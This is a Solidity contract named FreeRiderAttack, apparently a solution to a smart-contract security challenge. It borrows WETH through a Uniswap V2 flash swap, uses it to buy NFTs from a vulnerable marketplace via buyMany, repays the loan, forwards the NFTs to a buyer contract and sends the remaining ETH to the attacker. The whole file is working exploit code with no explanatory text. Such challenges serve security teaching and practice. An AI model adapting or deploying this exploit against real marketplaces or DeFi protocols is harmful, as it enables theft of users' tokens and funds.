// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IFreeRiderNFTMarketplace  {
    function token() external view returns(IERC721);
    function buyMany(uint256[] calldata tokenIds) external payable;
}


contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    
    using Address for address payable;
    
    IFreeRiderNFTMarketplace immutable nftMarketplace;
    address immutable nftBuyer;
    address immutable owner;
    
    constructor(address marketplace, address buyer) {
        nftMarketplace = IFreeRiderNFTMarketplace(marketplace);
        nftBuyer = buyer;
        owner = msg.sender;
    }
    
    function attack(address uniswapPair, uint amountWETH, uint256[] calldata tokenIds) external {
        IUniswapV2Pair(uniswapPair).swap(amountWETH, 0, address(this), abi.encode(tokenIds));
    }
    
    function uniswapV2Call(address /* sender */, uint amount0, uint /* amount1 */, bytes calldata data) external override {
        IWETH weth = IWETH(IUniswapV2Pair(msg.sender).token0());
        weth.withdraw(amount0);
        
        uint256[] memory tokenIds = abi.decode(data, (uint256[]));
        nftMarketplace.buyMany{ value: amount0 }(tokenIds);
        
        uint amountToReturn = (amount0 * 1000) / 997 + 1;
        weth.deposit{ value: amountToReturn }();
        weth.transfer(msg.sender, amountToReturn);
        
        // send nfts to buyer
        IERC721 nft = nftMarketplace.token();
        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), nftBuyer, tokenIds[i]);
        }
        
        // send eth to attacker
        payable(owner).sendValue(address(this).balance);
    }
    
    function onERC721Received(address /* operator */, address /* from */, uint256 /* tokenId */, bytes calldata /* data */) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
    
    receive() external payable {}
}
